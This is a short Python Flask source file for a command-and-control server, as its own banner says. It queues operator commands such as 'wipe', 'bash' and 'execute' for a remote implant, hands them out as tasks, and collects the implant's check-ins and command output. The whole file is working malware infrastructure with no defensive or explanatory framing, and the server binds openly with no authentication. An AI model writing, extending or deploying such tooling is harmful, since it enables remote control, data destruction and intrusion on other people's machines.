from flask import Flask, request, jsonify
import os
import uuid

app = Flask(__name__)

# --- STATE --- #
commandQ = []
tasks = {}
allowedCommands = ["whoami", "hostname", "pwd", "shutdown", "wipe", "bash", "read", "write", "execute"]

# --- ENDPOINTS --- #
@app.route("/")
def home():
    return "<h1>C2 Server Running</h1>"

@app.route("/checkin", methods=["POST"])
def checkin():
    data = request.json
    print("[+] Check-in received:", data)
    return jsonify({"status": "ok"})

#takes the first command on the command queue and issues the task to the implant.
@app.route("/command", methods=["GET"])
def command():
    if not commandQ:
        return jsonify({"status": "No Commands Queued"})
    cmd = commandQ.pop(0)
    taskID = str(uuid.uuid4())[:8]
    tasks[taskID] = cmd
    print(f'[+] Issuing task {taskID}: {cmd}')
    return jsonify({"taskID": taskID, "command": cmd})

#adds a command from the allowedCommands list to the queue. 
@app.route("/add_command", methods=["POST"])
def add_command():
    data = request.json
    cmd = data.get("command")
    if cmd not in allowedCommands:
        return jsonify({"error": "command not allowed."}), 403
    commandQ.append(cmd)
    print(f'[+] Command added to queue: {cmd}')
    return jsonify({"status": "command added", "command": cmd})

@app.route("/result", methods=["POST"])
def result():
    data = request.json
    taskID = data.get("taskID")
    output = data.get("output")
    cmd = tasks.get(taskID, "unknown")
    print(f"[+] Result received for {taskID} {cmd}: {output}")
    return jsonify({"status": "received"})

# --- RUN --- #
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)